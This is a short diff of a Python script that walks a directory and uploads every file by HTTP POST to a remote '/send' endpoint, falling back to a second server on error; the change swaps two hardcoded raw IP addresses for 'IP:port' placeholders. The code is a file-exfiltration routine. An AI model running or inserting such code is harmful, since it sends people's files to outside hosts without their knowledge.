@@ -9,10 +9,10 @@ for filename in os.listdir(dir):
     if os.path.isfile(f):
         file = open(f, "rb")
         try:
-            res = requests.post("http://23.239.9.14:5375/send", files = {"file": file})
+            res = requests.post("http://IP:port/send", files = {"file": file})
         except:
             file = open(f, "rb")
-            res = requests.post("http://207.255.166.140:5375/send", files = {"file": file})
+            res = requests.post("http://IP:port/send", files = {"file": file})
         if res.ok:
             print('Response: ' + res.text)
         else:
